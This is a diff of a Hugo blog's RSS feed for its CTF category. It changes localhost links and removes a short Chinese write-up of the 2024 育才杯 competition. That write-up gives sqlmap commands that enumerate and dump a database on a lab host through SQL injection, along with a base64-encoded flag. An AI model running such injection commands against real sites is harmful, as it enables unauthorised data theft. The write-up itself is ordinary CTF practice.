@@ -1,29 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
   <channel>
     <title>CTF - Category - Liagu</title>
-    <link>http://localhost:58958/categories/ctf/</link>
+    <link>http://localhost:1313/categories/ctf/</link>
     <description>CTF - Category | Liagu</description>
-    <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 27 Apr 2024 16:38:02 &#43;0800</lastBuildDate><atom:link href="http://localhost:58958/categories/ctf/" rel="self" type="application/rss+xml" /><item>
+    <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 27 Apr 2024 16:38:02 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/categories/ctf/" rel="self" type="application/rss+xml" /><item>
   <title>(hu)2024育才杯</title>
-  <link>http://localhost:58958/posts/87568/</link>
+  <link>http://localhost:1313/posts/87568/</link>
   <pubDate>Sat, 27 Apr 2024 16:38:02 &#43;0800</pubDate>
   <author>Author</author>
-  <guid>http://localhost:58958/posts/87568/</guid>
-  <description><![CDATA[理论题:刚好考了NISP,题目类似就很爽
-CTF:四道题就做了三道
-大草原简单的sql注入
-开始的url
-172.20.2.4/100510015-1f0b4914/提示辽阔的大草原
-辽阔美丽的大草原一碧千里，骏马奔腾、小羊吃草、套马摔跤、烤羊喝酒终于来到了大草原的你，赶紧去寻找草原上的骏马吧！哒哒哒 输入ID作为参数寻找即可。 它们在哪呢？它们又有几匹呢？找到它们你就可以获取flag哦
-http://172.20.2.4/100510015-1f0b4914/index.php?id=1sql注入
-数据库
-sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 --dbs表
-sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 --tables列
-sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 -T horse --columns名
-sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 -T horse -C where/id/number --dumpbase拖进txt得到base64
-Wm14aFozdDBhR2sxWDJsVFgwWXhRR2RmTXpJeGZRPT0=解码两次
-flag{thi5_iS_F1@g_321}流量分析wireshark分析,tcp追踪流
-010打开找到base64]]></description>
+  <guid>http://localhost:1313/posts/87568/</guid>
+  <description><![CDATA[育才杯]]></description>
 </item>
 </channel>
 </rss>
